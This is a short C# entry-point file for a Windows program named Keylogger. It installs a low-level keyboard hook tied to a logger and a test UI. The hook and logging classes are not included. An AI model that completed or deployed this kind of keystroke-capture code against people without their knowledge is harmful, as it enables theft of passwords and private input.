using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace IP
{
    class Keylogger
    {
        [STAThread]
        static void Main(string[] args)
        {
            LoggerWriter logger = new LoggerWriter();
            TestUI UI = new TestUI(logger);
            LLKeyboardHook hook = new LLKeyboardHook(UI, logger);

            hook.Install();

            Application.EnableVisualStyles();
            Application.Run(UI);

            hook.Uninstall();

        }
    }


}
